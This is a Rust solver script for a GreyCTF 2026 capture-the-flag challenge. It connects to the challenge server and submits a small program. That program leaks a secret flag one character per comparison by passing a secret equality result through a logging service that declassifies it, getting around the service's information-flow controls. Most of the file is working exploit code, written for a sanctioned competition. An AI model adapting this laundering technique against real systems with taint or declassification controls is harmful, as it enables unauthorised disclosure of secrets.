// Sweep solver for "An old soviet terminal" (GreyCTF 2026, misc).
//
// Walks the flag in small index WINDOWS, one window per connection, concatenating
// chars across connections (no single node can finish the whole scan inside its
// 2000ms life). Every connection's raw output -> attack.log. Every FOUND character
// -> found.log (the success log you asked for). Final flag printed + saved.
//
// Attack (IFC laundering), runs as retriever() ON the receiver node:
//   compare(i,ch) -> SECRET equality bool (charAt transmission i == ch), never declassified
//   log(x)        -> declassify(x) -> PUBLIC          (the laundromat)
//   p i d : send compare-bool to log, receive PUBLIC bool, return it (pc stays LOW)
//   sc i j: linear-scan freq-ordered charset, early-exit on first PUBLIC match
//   bd i h: walk indices [i,h), concat per-index char; out-of-range idx -> "?"  (flag end)
//
//   rustc -O full_attack.rs -o full_attack
//   ./full_attack [START] [WINDOW] [GAP_SECS] [MAXLEN]
//     START    first index to scan        (default 0)
//     WINDOW   chars per connection        (default 4)   keep small -> must fit 2000ms
//     GAP_SECS seconds between EVERY connect attempt (default 60)  <- rate limiter.
//              override to 1 for fast mode once the server tolerates it.
//     MAXLEN   stop after this many chars  (default 64)  (also stops early on '?')
//
// RETRY POLICY: connect-fail -> retry (paced). connected-but-no-usable-result
// (abnormal / no-teletype / srvbusy) -> retry the SAME window (transient: node
// killed or server closed early). A clean Message advances the window.

use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use std::fs::OpenOptions;

const HOST: &str = "challs.nusgreyhats.org";
const PORT: u16 = 36167;
const RAWLOG: &str = "attack.log";   // raw server bytes, every connection
const FOUNDLOG: &str = "found.log";  // one line per found char / window success
const FLAGFILE: &str = "flag.txt";   // final assembled flag

// charset ORDERED: flag structure first, then lowercase by English freq, digits,
// symbols, uppercase last -> real grey{...} chars match in 1-6 compares (cheap).
const PROG: &str = r#"let val cs="grey{}_etaoinshrdlcumwfgypbvkxjqz0123456789-!?.+=*ABCDEFGHIJKLMNOPQRSTUVWXYZ"
fun a j=substring(cs,j,j+1)
fun p i d=(send(analysisService,("compare",self(),i,d));receive[hn("comparison",s)=>(send(logService,("log",self(),s));receive[hn("logged",b)=>b])])
fun sc i j=if a j="" then "?" else if p i(a j)then a j else sc i(j+1)
fun bd i h=if i>=h then "" else (sc i 0)^bd(i+1)h
in bd __LO__ __HI__ end
"#;

const DRAIN: Duration = Duration::from_millis(2500); // read window per connection

fn now_ts() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
}

fn contains(hay: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || hay.len() < needle.len() { return false; }
    hay.windows(needle.len()).any(|w| w == needle)
}

// Read until EOF or `overall` elapses. needle stops early when given.
fn read_phase(s: &mut TcpStream, needle: Option<&[u8]>, overall: Duration) -> Vec<u8> {
    let mut buf = Vec::new();
    let mut tmp = [0u8; 8192];
    let start = Instant::now();
    loop {
        if start.elapsed() >= overall { break; }
        match s.read(&mut tmp) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&tmp[..n]);
                if let Some(nd) = needle { if contains(&buf, nd) { break; } }
            }
            Err(e) => match e.kind() {
                // keep waiting until `overall` elapses (loop top checks). Needle is
                // satisfied via the Ok(n) branch; here we just don't give up early.
                std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut => continue,
                _ => break,
            },
        }
    }
    buf
}

// STAGED interaction (like pwntools): connect -> wait menu ">>" -> send "4\n" ->
// wait transmission ">>" -> send program + "\nEOF\n" -> drain result. Blind one-shot
// blasting fails: the transmission terminal flushes stdin on mode-switch, dropping a
// program sent in the same write. `prog` here is the raw program (NO leading "4\n").
fn attempt(addr: &std::net::SocketAddr, prog: &[u8]) -> std::io::Result<Vec<u8>> {
    let mut s = TcpStream::connect_timeout(addr, Duration::from_secs(6))?;
    s.set_read_timeout(Some(Duration::from_millis(150)))?;
    s.set_write_timeout(Some(Duration::from_secs(4)))?;
    let mut out = Vec::new();

    // stage 1: wait for the menu prompt, pick service 4 (Transmission)
    out.extend_from_slice(&read_phase(&mut s, Some(b">>"), Duration::from_secs(4)));
    s.write_all(b"4\n")?;
    s.flush()?;

    // stage 2: wait for the transmission prompt, then submit program + EOF
    out.extend_from_slice(&read_phase(&mut s, Some(b">>"), Duration::from_secs(4)));
    s.write_all(prog)?;
    s.write_all(b"\nEOF\n")?;
    s.flush()?;

    // stage 3: drain the teletype result
    out.extend_from_slice(&read_phase(&mut s, None, DRAIN));
    Ok(out)
}

// extract retriever() return from the teletype box: text after "Message: ",
// box borders + whitespace stripped. None if no Message present.
fn parse_message(out: &str) -> Option<String> {
    for line in out.lines() {
        if let Some(i) = line.find("Message:") {
            let after = &line[i + "Message:".len()..];
            let cleaned: String = after.chars().filter(|&c| c != '\u{2551}').collect();
            return Some(cleaned.trim().to_string());
        }
    }
    None
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let start: usize  = args.get(1).and_then(|x| x.parse().ok()).unwrap_or(0);
    let mut window: usize = args.get(2).and_then(|x| x.parse().ok()).unwrap_or(4).max(1);
    let gap: u64      = args.get(3).and_then(|x| x.parse().ok()).unwrap_or(60);
    let maxlen: usize = args.get(4).and_then(|x| x.parse().ok()).unwrap_or(64);
    const MAX_WIN_TRIES: u32 = 12;   // same window fails this many -> shrink (too slow for 2000ms)

    let addr = match (HOST, PORT).to_socket_addrs().ok().and_then(|mut a| a.next()) {
        Some(a) => a,
        None => { eprintln!("[!] DNS resolve failed"); std::process::exit(2); }
    };

    let mut raw = OpenOptions::new().create(true).append(true).open(RAWLOG).expect("open raw log");
    let mut found = OpenOptions::new().create(true).append(true).open(FOUNDLOG).expect("open found log");

    println!("[*] sweep start={} window={} gap={}s maxlen={} -> raw={} found={}",
             start, window, gap, maxlen, RAWLOG, FOUNDLOG);
    let _ = found.write_all(format!("\n##### RUN ts={} start={} window={} gap={}s #####\n",
                                    now_ts(), start, window, gap).as_bytes());
    let _ = found.flush();

    let end = start + maxlen;
    let mut lo = start;
    let mut flag = String::new();
    let mut iter: u64 = 0;
    let mut consec_connfail: u32 = 0;
    let mut win_tries: u32 = 0;          // failures on the CURRENT window (resets on advance/shrink)
    let mut flag_end = false;

    loop {
        if lo >= end { break; }
        // rate limiter: GAP_SECS between EVERY connect attempt (not before the first)
        if iter > 0 { std::thread::sleep(Duration::from_secs(gap)); }
        iter += 1;

        let hi = (lo + window).min(end);
        let prog = PROG.replace("__LO__", &lo.to_string()).replace("__HI__", &hi.to_string());
        if prog.len() > 600 { eprintln!("[!] window [{},{}) over 600B, shrink WINDOW", lo, hi); std::process::exit(2); }

        let t0 = Instant::now();
        let res = attempt(&addr, prog.as_bytes());
        let dt = t0.elapsed().as_secs_f32();

        let (out, note) = match res {
            Err(e) => (String::new(), format!("connfail: {}", e)),
            Ok(b)  => {
                let os = String::from_utf8_lossy(&b).to_string();
                let nt = if os.contains("Message:") { "message".to_string() }
                    else if os.contains("terminated abnormally") { "abnormal/timeout".to_string() }
                    else if os.contains("BlockingIOError") || os.contains("Resource temporarily") { "srvbusy".to_string() }
                    else { "no-teletype".to_string() };
                (os, nt)
            }
        };

        // raw log every connection
        let hdr = format!("\n===== ts={} iter{} win[{}:{}] -> {} ({:.2}s) =====\n", now_ts(), iter, lo, hi, note, dt);
        let _ = raw.write_all(hdr.as_bytes());
        let _ = raw.write_all(if out.is_empty() { b"(no output)\n" } else { out.as_bytes() });
        let _ = raw.flush();
        println!("{}", hdr.trim_end());

        if note.starts_with("connfail") {
            consec_connfail += 1;
            println!("(connect failed — retry after gap)  consec={}", consec_connfail);
            if consec_connfail >= 60 { eprintln!("[!] {} consecutive connect-fails — server down, aborting", consec_connfail); break; }
            continue;
        }
        consec_connfail = 0;

        let mut advanced = false;
        if let Some(msg) = parse_message(&out) {
            // msg = this window's chars; '?' marks an out-of-range index = flag end
            let cut = msg.find('?').unwrap_or(msg.len());
            let chars: String = msg[..cut].to_string();
            let nfound = chars.chars().count();

            if nfound > 0 {
                // record each found char to found.log
                for (k, c) in chars.chars().enumerate() {
                    let idx = lo + k;
                    flag.push(c);
                    let line = format!("ts={} idx={} char={:?} partial={}\n", now_ts(), idx, c, flag);
                    let _ = found.write_all(line.as_bytes());
                    println!("  [+] idx {} = {:?}   partial: {}", idx, c, flag);
                }
                let _ = found.write_all(format!("  -- win[{}:{}] = {:?}\n", lo, hi, chars).as_bytes());
                let _ = found.flush();
                lo += nfound;
                win_tries = 0;
                advanced = true;
            }
            if msg.contains('?') { flag_end = true; break; }   // hit end of flag (after recording any chars)
        } else {
            // connected but abnormal / no-teletype / srvbusy -> no usable chars
            println!("(connected, '{}' — no chars)", note);
        }

        // didn't advance -> count it; too many on one window = window too slow -> shrink, else abort
        if !advanced {
            win_tries += 1;
            println!("    win[{}:{}] fail {}/{}", lo, hi, win_tries, MAX_WIN_TRIES);
            if win_tries >= MAX_WIN_TRIES {
                if window > 1 {
                    window = (window / 2).max(1);
                    win_tries = 0;
                    println!("[~] window stuck -> shrink WINDOW to {} (too slow for 2000ms node)", window);
                } else {
                    eprintln!("[!] idx {} stuck at WINDOW=1 after {} tries — server too slow/flaky, aborting", lo, MAX_WIN_TRIES);
                    break;
                }
            }
        }
    }

    let _ = found.write_all(format!("##### END ts={} flag={:?} end_marker={} #####\n", now_ts(), flag, flag_end).as_bytes());
    let _ = found.flush();
    let _ = OpenOptions::new().create(true).write(true).truncate(true).open(FLAGFILE)
        .and_then(|mut f| f.write_all(flag.as_bytes()));

    println!("\n==============================");
    println!("[=] assembled: {}", flag);
    if flag_end { println!("[+] reached flag end ('?'). saved -> {} / {}", FLAGFILE, FOUNDLOG); }
    else        { println!("[~] stopped (maxlen or server down). partial saved -> {} / {}", FLAGFILE, FOUNDLOG); }
}
